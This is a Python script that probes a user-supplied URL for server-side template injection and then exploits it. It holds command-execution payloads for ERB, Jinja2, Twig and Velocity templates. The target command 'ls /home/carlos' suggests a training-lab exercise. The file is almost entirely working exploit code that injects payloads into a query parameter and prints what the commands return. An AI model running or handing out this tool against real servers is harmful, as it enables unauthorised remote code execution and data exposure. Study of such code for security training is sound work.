import requests
from urllib.parse import quote

payloads = {
    "erb": ["<%= 7*7 %>", "<%= system('ls') %>"],
    "jinja2": ["{{ 7*7 }}", "{{ ''.__class__.__mro__[1].__subclasses__()[59]('ls').read() }}"],
    "twig": ["{{ 7*7 }}", "{{ system('ls') }}"],
    "velocity": ["#set($x = 7 * 7)", "$x", "#set($x = 7 * 7) $x", "#set($cmd = 'ls')", "#foreach($i in [1])", "$i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd)", "#end"]
}

def check_and_exploit_ssti(url):
    """
    Checks for and exploits SSTI vulnerabilities on a given URL.
    
    Args:
        url (str): The URL to test for SSTI vulnerabilities.
    
    Returns:
        list: A list of results indicating detected SSTI vulnerabilities.
    """
    param = "message"
    results = []

    def check_ssti(url, param):
        """
        Checks for SSTI vulnerabilities using predefined payloads.
        
        Args:
            url (str): The URL to test.
            param (str): The parameter to inject the payload into.
        
        Returns:
            tuple: A tuple indicating whether SSTI was detected and the engine used.
        """
        for engine, tests in payloads.items():
            for payload in tests:
                encoded_payload = quote(payload)
                test_url = f"{url}?{param}={encoded_payload}"

                try:
                    response = requests.get(test_url)
                    if response.status_code == 200 and "49" in response.text:
                        results.append(f"SSTI vulnerability detected with {engine} payload: {payload}")
                        return True, engine
                except requests.RequestException as e:
                    pass
        
        return False, None

    def exploit_ssti(url, param, engine, command):
        """
        Exploits SSTI vulnerabilities using the detected engine and a command.
        
        Args:
            url (str): The URL to exploit.
            param (str): The parameter to inject the exploit payload into.
            engine (str): The engine used for SSTI.
            command (str): The command to execute.
        """
        if engine not in payloads:
            return
        
        if engine == "erb":
            exploit_payload = f"<%= system('{command}') %>"
        elif engine == "jinja2":
            exploit_payload = f"{{{{ ''.__class__.__mro__[1].__subclasses__()[59]('{command}').read() }}}}"
        elif engine == "twig":
            exploit_payload = f"{{{{ system('{command}') }}}}"
        elif engine == "velocity":
            exploit_payload = f"#set($cmd = '{command}') #foreach($i in [1]) $i.getClass().forName('java.lang.Runtime').getRuntime().exec($cmd) #end"
        else:
            return
        
        encoded_payload = quote(exploit_payload)
        exploit_url = f"{url}?{param}={encoded_payload}"
        try:
            response = requests.get(exploit_url)
            if response.status_code == 200:
                print(f"Exploitation result: {response.text}")
        except requests.RequestException as e:
            print(f"Error exploiting SSTI: {e}")

    ssti_detected, engine = check_ssti(url, param)
    if ssti_detected:
        exploit_ssti(url, param, engine, "ls /home/carlos")

    return results

if __name__ == "__main__":
    target_url = input('Enter the URL to test for SSTI: ')
    results = check_and_exploit_ssti(target_url)
    for result in results:
        print(result)
